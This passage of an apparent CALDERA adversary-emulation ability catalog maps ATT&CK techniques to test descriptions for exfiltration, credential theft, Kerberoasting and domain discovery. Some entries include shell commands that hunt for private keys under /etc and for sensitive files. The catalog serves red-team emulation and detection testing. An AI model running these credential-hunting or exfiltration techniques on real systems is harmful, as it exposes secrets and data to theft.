        "technique_name": "Exfiltration Over Alternative Protocol - Exfiltration Over Asymmetric Encrypted Non-C2 Protocol",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Exfiltrate data HTTPS using curl windows",
        "tactic": "exfiltration",
        "plugin": "atomic",
        "ability_id": "36f50411a52fddf639b03b14918d988f",
        "technique_id": "T1048.002",
        "repeatable": false
    },
    {
        "description": "This test uses rclone to exfiltrate data to a remote cloud storage instance. (Mega)\nSee https://thedfirreport.com/2022/06/16/sans-ransomware-summit-2022-can-you-detect-this/\n",
        "buckets": [
            "exfiltration"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Exfiltration Over Web Service: Exfiltration to Cloud Storage",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Exfiltrate data with rclone to cloud Storage - Mega (Windows)",
        "tactic": "exfiltration",
        "plugin": "atomic",
        "ability_id": "447a2314183957f35cccd808182c0997",
        "technique_id": "T1567.002",
        "repeatable": false
    },
    {
        "description": "Rclone may be used by an adversary to exfiltrate data to a publicly hosted FTP server.\n[Reference](https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/)",
        "buckets": [
            "exfiltration"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Exfiltration Over Alternative Protocol - FTP - Rclone",
        "tactic": "exfiltration",
        "plugin": "atomic",
        "ability_id": "3f73be176cadf2762623b3117e25335d",
        "technique_id": "T1048.003",
        "repeatable": false
    },
    {
        "description": "Exfiltration of specified file over HTTP.\nUpon successful execution, powershell will invoke web request using POST method to exfiltrate notepad.exe to a remote address (default http://127.0.0.1). Results will be via stdout.\n",
        "buckets": [
            "exfiltration"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Exfiltration Over Alternative Protocol - HTTP",
        "tactic": "exfiltration",
        "plugin": "atomic",
        "ability_id": "548a620bf3463f72a42937faf7614935",
        "technique_id": "T1048.003",
        "repeatable": false
    },
    {
        "description": "Exfiltration of specified file over ICMP protocol.\n\nUpon successful execution, powershell will utilize ping (icmp) to exfiltrate notepad.exe to a remote address (default 127.0.0.1). Results will be via stdout.\n",
        "buckets": [
            "exfiltration"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Exfiltration Over Alternative Protocol - ICMP",
        "tactic": "exfiltration",
        "plugin": "atomic",
        "ability_id": "6baab84fe7a52dd5c4ede612fc0d255f",
        "technique_id": "T1048.003",
        "repeatable": false
    },
    {
        "description": "Exfiltration of specified file over SMTP.\nUpon successful execution, powershell will send an email with attached file to exfiltrateto a remote address. Results will be via stdout.\n",
        "buckets": [
            "exfiltration"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Exfiltration Over Alternative Protocol - SMTP",
        "tactic": "exfiltration",
        "plugin": "atomic",
        "ability_id": "e4316d90e4dbc776f4e2bae602109d83",
        "technique_id": "T1048.003",
        "repeatable": false
    },
    {
        "description": "The following Atomic test will utilize Mimikatz to extract the certificates from the local system My store. This tool is available at https://github.com/gentilkiwi/mimikatz and can be obtained using the get-prereq_commands.\nA successful attempt will stdout the certificates and write multiple .pfx and .der files to disk.\n",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Unsecured Credentials: Private Keys",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Export Certificates with Mimikatz",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "fd3ee5ac9978245dae1e7563a1c6b13d",
        "technique_id": "T1552.004",
        "repeatable": false
    },
    {
        "description": "Creates a Root certificate and exports it with Export-Certificate PowerShell Cmdlet.\nUpon a successful attempt, this will write a pfx to disk and utilize the Cmdlet Export-Certificate.\n",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Unsecured Credentials: Private Keys",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Export Root Certificate with Export-Certificate",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "995eb25ee0b9d036110318311ca2527b",
        "technique_id": "T1552.004",
        "repeatable": false
    },
    {
        "description": "Creates a Root certificate and exports it with Export-PFXCertificate PowerShell Cmdlet.\nUpon a successful attempt, this will write a pfx to disk and utilize the Cmdlet Export-PFXCertificate.\n",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Unsecured Credentials: Private Keys",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Export Root Certificate with Export-PFXCertificate",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "f7257d271a176f7c609b4a33513d2eef",
        "technique_id": "T1552.004",
        "repeatable": false
    },
    {
        "description": "This module attempts to emulate malware authors utilizing well known techniques to extract data from memory/binary files. To do this\nwe first create a string in memory then pull out the pointer to that string. Finally, it uses this pointer to copy the contents of that\nmemory location to a file stored in the $env:TEMP\\atomic_t1059_005_test_output.bin.\n",
        "buckets": [
            "execution"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Command and Scripting Interpreter: Visual Basic",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Extract Memory via VBA",
        "tactic": "execution",
        "plugin": "atomic",
        "ability_id": "42302f7d89c15f8070f83e743771d567",
        "technique_id": "T1059.005",
        "repeatable": false
    },
    {
        "description": "This module will extract the credentials found within the Windows credential manager and dump\nthem to $env:TEMP\\windows-credentials.txt\n",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Credentials from Password Stores",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Extract Windows Credential Manager via VBA",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "935e8026584b85192519c57d7080b048",
        "technique_id": "T1555",
        "repeatable": false
    },
    {
        "description": "The following test will utilize setspn to extract the Service Principal Names. This behavior is typically used during a kerberos or silver ticket attack. \nA successful execution will output all the SPNs for the related domain. \n",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Steal or Forge Kerberos Tickets: Kerberoasting",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Extract all accounts in use as SPN using setspn",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "e0496104d8da1ada94001fe7778e7402",
        "technique_id": "T1558.003",
        "repeatable": false
    },
    {
        "description": "This module extracts a binary (calc.exe) from inside of another binary. \n\nIn the wild maldoc authors will use this technique to hide binaries inside of files stored \nwithin the office document itself. An example of this technique can be seen in sample\n\nf986040c7dd75b012e7dfd876acb33a158abf651033563ab068800f07f508226\n\nThis sample contains a document inside of itself. Document 1 is the actual maldoc itself, document 2\nis the same document without all the malicious code. Document 1 will copy Document 2 to the file system\nand then \"peek\" inside of this document and pull out the oleObject.bin file. Contained inside of this\noleObject.bin file is a payload that is parsed out and executed on the file system.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Hide Artifacts",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Extract binary files via VBA",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "b7f89af9214876eae185527350ca034f",
        "technique_id": "T1564",
        "repeatable": false
    },
    {
        "description": "Extracting Credentials from Files. Upon execution, the contents of files that contain the word \"password\" will be displayed.\n",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Unsecured Credentials: Credentials In Files",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Extracting passwords with findstr",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "aeb4fdbb3453127caaef0ad5c250d838",
        "technique_id": "T1552.001",
        "repeatable": false
    },
    {
        "description": "Use PowerShell to download and write an arbitrary file from the internet. Example is from the 2021 Threat Detection Report by Red Canary.\n",
        "buckets": [
            "command-and-control"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Ingress Tool Transfer",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "File Download via PowerShell",
        "tactic": "command-and-control",
        "plugin": "atomic",
        "ability_id": "b0e28215c59037cc6cdb61b38615c32d",
        "technique_id": "T1105",
        "repeatable": false
    },
    {
        "description": "download and execute a file masquerading as images or Office files. Upon execution 3 calc instances and 3 vbs windows will be launched.\n\ne.g SOME_LEGIT_NAME.[doc,docx,xls,xlsx,pdf,rtf,png,jpg,etc.].[exe,vbs,js,ps1,etc] (Quartelyreport.docx.exe)\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Masquerading: Rename System Utilities",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "File Extension Masquerading",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "ff78708e0e18d31c0be7a2be295158ec",
        "technique_id": "T1036.003",
        "repeatable": false
    },
    {
        "description": "Hunts for files of a certain extension and inserts a message",
        "buckets": [
            "impact"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Data Manipulation: Stored Data Manipulation",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [
                    "mission.go"
                ],
                "command": "./mission.go -duration 60 -extension .caldera -dir '/'",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "File Hunter Mission",
        "tactic": "impact",
        "plugin": "stockpile",
        "ability_id": "55f9600a-756f-496b-b27f-682052dc429c",
        "technique_id": "T1565.001",
        "repeatable": false
    },
    {
        "description": "Find or discover files on the file system",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "File and Directory Discovery",
        "requirements": [
            {
                "relationship_match": [
                    {
                        "source": "host.system.path"
                    }
                ],
                "module": "plugins.stockpile.app.requirements.paw_provenance"
            }
        ],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "File and Directory Discovery",
        "tactic": "discovery",
        "plugin": "stockpile",
        "ability_id": "1c353eb4-29ab-4dfe-88ed-f34f5a60848e",
        "technique_id": "T1083",
        "repeatable": false
    },
    {
        "description": "Find or discover files on the file system. Upon execution, file and folder information will be displayed.\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "File and Directory Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "File and Directory Discovery (PowerShell)",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "d7967a23c8c030c698893f242e622be1",
        "technique_id": "T1083",
        "repeatable": false
    },
    {
        "description": "Find or discover files on the file system.  Upon successful execution, this test will output the results of all the data discovery commands to a specified file.\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "File and Directory Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "File and Directory Discovery (cmd.exe)",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "a09dd05a4de1fd52c13deada3209e4aa",
        "technique_id": "T1083",
        "repeatable": false
    },
    {
        "description": "Simulate a file download using finger.exe. Connect to localhost by default, use custom input argument to test finger connecting to an external server.\nBecause this is being tested on the localhost, you should not be expecting a successful connection\nhttps://www.exploit-db.com/exploits/48815\nhttps://www.bleepingcomputer.com/news/security/windows-10-finger-command-can-be-abused-to-download-or-steal-files/\n",
        "buckets": [
            "command-and-control"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Ingress Tool Transfer",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "File download with finger.exe on Windows",
        "tactic": "command-and-control",
        "plugin": "atomic",
        "ability_id": "7262a40d1253cb58b4e54fc1aacc938a",
        "technique_id": "T1105",
        "repeatable": false
    },
    {
        "description": "Find Domain information",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "System Network Configuration Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Find Domain",
        "tactic": "discovery",
        "plugin": "stockpile",
        "ability_id": "14a21534-350f-4d83-9dd7-3c56b93a0c17",
        "technique_id": "T1016",
        "repeatable": false
    },
    {
        "description": "This ability will locate directories that are cloned Git repositories.",
        "buckets": [
            "collection"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Data from Local System",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "for directoryname in $(find /home/ -name '.git' -type d 2>/dev/null | head -5); do\n\tprintf \"$(dirname \"$directoryname\")\\n\";\ndone;",
                "platform": "linux",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.basic",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "source": "host.dir.git",
                                "custom_parser_vals": {},
                                "target": ""
                            }
                        ]
                    }
                ],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Find Git Repositories",
        "tactic": "collection",
        "plugin": "stockpile",
        "ability_id": "720a3356-eee1-4015-9135-0fc08f7eb2d5",
        "technique_id": "T1005",
        "repeatable": false
    },
    {
        "description": "Find hostname of remote host",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Remote System Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Find Hostname",
        "tactic": "discovery",
        "plugin": "stockpile",
        "ability_id": "fdf8bf36-797f-4157-805b-fe7c1c6fc903",
        "technique_id": "T1018",
        "repeatable": false
    },
    {
        "description": "Get process info for LSASS",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Process Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Find LSASS",
        "tactic": "discovery",
        "plugin": "stockpile",
        "ability_id": "0bff4ee7-42a4-4bde-b09a-9d79d8b9edd7",
        "technique_id": "T1057",
        "repeatable": false
    },
    {
        "description": "takes a computer and determines who has admin rights over it through GPO enumeration. Upon execution, information about the machine will be displayed.\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Permission Groups Discovery: Domain Groups",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Find Local Admins via Group Policy (PowerView)",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "0a96ef5851da1be487cebdd9a1f86b7a",
        "technique_id": "T1069.002",
        "repeatable": false
    },
    {
        "description": "Find OS Version",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "System Information Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Find OS Version",
        "tactic": "discovery",
        "plugin": "stockpile",
        "ability_id": "b6b105b9-41dc-490b-bc5c-80d699b82ce8",
        "technique_id": "T1082",
        "repeatable": false
    },
    {
        "description": "Find System Network Connections",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "System Network Connections Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "netstat -anto",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Find System Network Connections",
        "tactic": "discovery",
        "plugin": "stockpile",
        "ability_id": "638fb6bb-ba39-4285-93d1-7e4775b033a8",
        "technique_id": "T1049",
        "repeatable": false
    },
    {
        "description": "Query the registry to determine the version of internet explorer installed on the system.\nUpon execution, version information about internet explorer will be displayed.\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Software Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Find and Display Internet Explorer Browser Version",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "8ddfaf982ab359cda13626b870ccb339",
        "technique_id": "T1518",
        "repeatable": false
    },
    {
        "description": "Find existing user session on other computers. Upon execution, information about any sessions discovered will be displayed.",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "System Owner/User Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Find computers where user has session - Stealth mode (PowerView)",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "cfcf66cc85109ad2ebdb301d619fa41f",
        "technique_id": "T1033",
        "repeatable": false
    },
    {
        "description": "Locate files deemed sensitive",
        "buckets": [
            "collection"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Data from Local System",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "find / -name '*.#{file.sensitive.extension}' -type f -not -path '*/\\.*' -size -500k 2>/dev/null | head -5",
                "platform": "linux",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.basic",
                        "parserconfigs": [
                            {
                                "edge": "has_extension",
                                "source": "host.file.path",
                                "custom_parser_vals": {},
                                "target": "file.sensitive.extension"
                            }
                        ]
                    }
                ],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Find files",
        "tactic": "collection",
        "plugin": "stockpile",
        "ability_id": "90c2efaa-8205-480d-8bb6-61d90dbaf81b",
        "technique_id": "T1005",
        "repeatable": false
    },
    {
        "description": "Enumerates members of the local Administrators groups across all machines in the domain. Upon execution, information about each machine will be displayed.\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Permission Groups Discovery: Domain Groups",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Find local admins on all machines in domain (PowerView)",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "84a93e5157b690ee0f585cd55c15b0cb",
        "technique_id": "T1069.002",
        "repeatable": false
    },
    {
        "description": "Find machines where user has local admin access (PowerView). Upon execution, progress and info about each host in the domain being scanned will be displayed.\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Permission Groups Discovery: Domain Groups",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Find machines where user has local admin access (PowerView)",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "03c8721619373b6c18a55721a33cad2c",
        "technique_id": "T1069.002",
        "repeatable": false
    },
    {
        "description": "Find private keys on the file system",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Unsecured Credentials: Private Keys",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "for i in .key .pgp .gpg .ppk .p12 .pem .pfx .cer .p7b .asc .crt;do find /etc -maxdepth 3 -name \"*${i}\" 2>/dev/null;done;",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Find private keys",
        "tactic": "credential-access",
        "plugin": "stockpile",
        "ability_id": "de632c2d-a729-4b77-b781-6a6b09c148ba",
        "technique_id": "T1552.004",
        "repeatable": false
    },
    {
        "description": "Get process info for processes running as a user",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Process Discovery",
        "requirements": [
            {
                "relationship_match": [
                    {
                        "source": "host.user.name"
                    }
                ],
                "module": "plugins.stockpile.app.requirements.paw_provenance"
            }
        ],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "ps aux | grep #{host.user.name}",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Find user processes",
        "tactic": "discovery",
        "plugin": "stockpile",
        "ability_id": "3b5db901-2cb8-4df7-8043-c4628a6a5d5a",
        "technique_id": "T1057",
        "repeatable": false
    },
    {
        "description": "Look for the encrypted cpassword value within Group Policy Preference files on the Domain Controller.\nThis test is intended to be run from a domain joined workstation, not on the Domain Controller itself.\nThe Get-GPPPasswords.ps1 executed during this test can be obtained using the get-prereq_commands.\n\nSuccessful test execution will either display the credentials found in the GPP files or indicate \"No preference files found\".\n",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Unsecured Credentials: Group Policy Preferences",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "GPP Passwords (Get-GPPPassword)",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "410108b9909252e207bfaa7d92a117f4",
        "technique_id": "T1552.006",
        "repeatable": false
    },
    {
        "description": "Look for the encrypted cpassword value within Group Policy Preference files on the Domain Controller. This value can be decrypted with gpp-decrypt on Kali Linux.\n",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Unsecured Credentials: Group Policy Preferences",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "GPP Passwords (findstr)",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "53d863a190b41b6af474be875b74784b",
        "technique_id": "T1552.006",
        "repeatable": false
    },
    {
        "description": "get current system time (ISO 8601)",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "System Time Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "date -u +\"%Y-%m-%dT%H:%M:%SZ\"",
                "platform": "linux",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.basic",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "source": "host.current.time",
                                "custom_parser_vals": {},
                                "target": ""
                            }
                        ]
                    }
                ],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Get System Time",
        "tactic": "discovery",
        "plugin": "stockpile",
        "ability_id": "fa6e8607-e0b1-425d-8924-9b894da5a002",
        "technique_id": "T1124",
        "repeatable": false
    },
    {
        "description": "When successful, accounts that do not require kerberos pre-auth will be returned.\nReference: https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Permission Groups Discovery: Domain Groups",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Get-ADUser Enumeration using UserAccountControl flags (AS-REP Roasting)",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "42102f01777d40a7db982282c4c791e9",
        "technique_id": "T1069.002",
        "repeatable": false
    },
    {
        "description": "Utilizing PowerView, run Get-DomainController to identify the Domain Controller. Upon execution, information about the domain controller within the domain will be displayed.\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Remote System Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Get-DomainController with PowerView",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "aaeee9107989a507f526b0cef1cb274f",
        "technique_id": "T1018",
        "repeatable": false
    },
    {
        "description": "Use PowerView to Get-DomainGPO This will only work on Windows 10 Enterprise and A DC Windows 2019.",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Group Policy Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Get-DomainGPO to display group policy information via PowerView",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "38714562d32f33dc32bd7aef553771d9",
        "technique_id": "T1615",
        "repeatable": false
    },
    {
        "description": "Utilizing PowerView, run Get-DomainGroup to identify the domain groups. Upon execution, Groups within the domain will be listed.\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Permission Groups Discovery: Domain Groups",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Get-DomainGroup with PowerView",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "57781057e51ffecf21e38fd31c9d2f79",
        "technique_id": "T1069.002",
        "repeatable": false
    },
    {
        "description": "Utilizing PowerView, run Get-DomainGroupMember to identify domain users. Upon execution, progress and info about groups within the domain being scanned will be displayed.\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Permission Groups Discovery: Domain Groups",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Get-DomainGroupMember with PowerView",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "2594698a8e38a85b0d98468d87b49821",
        "technique_id": "T1069.002",
        "repeatable": false
    },
    {
        "description": "Utilizing PowerView, run Get-DomainPolicy to return the default domain policy or the domain controller policy for the current domain or a specified domain/domain controller.\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Password Policy Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Get-DomainPolicy with PowerView",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "214be4092770061080ef0781c26bab3e",
        "technique_id": "T1201",
        "repeatable": false
    },
    {
        "description": "Utilizing PowerView, run Get-DomainTrust to identify domain trusts. Upon execution, progress and info about trusts within the domain being scanned will be displayed.\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Domain Trust Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Get-DomainTrust with PowerView",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "53571e9988b92014f9d71888936d3878",
        "technique_id": "T1482",
        "repeatable": false
    },
    {
        "description": "Utilizing PowerView, run Get-DomainUser to identify domain users. Upon execution, progress and info about users within the domain being scanned will be displayed.\n",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Steal or Forge Kerberos Tickets: AS-REP Roasting",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Get-DomainUser with PowerView",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "e0c75b4cc32124ef4c61508694fd0808",
        "technique_id": "T1558.004",
        "repeatable": false
    },
    {
        "description": "Utilizing PowerView, run Get-DomainUser to identify the domain users. Upon execution, Users within the domain will be listed.\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Account Discovery: Domain Account",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Get-DomainUser with PowerView",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "c84a57391dbc724dc51436deb3e0ca00",
        "technique_id": "T1087.002",
        "repeatable": false
    },
    {
        "description": "Utilizing PowerView, run Get-ForestTrust to identify forest trusts. Upon execution, progress and info about forest trusts within the domain being scanned will be displayed.\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Domain Trust Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Get-ForestTrust with PowerView",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "feb9647c55185e3b6045293fd26f6a5b",
        "technique_id": "T1482",
        "repeatable": false
    },
    {
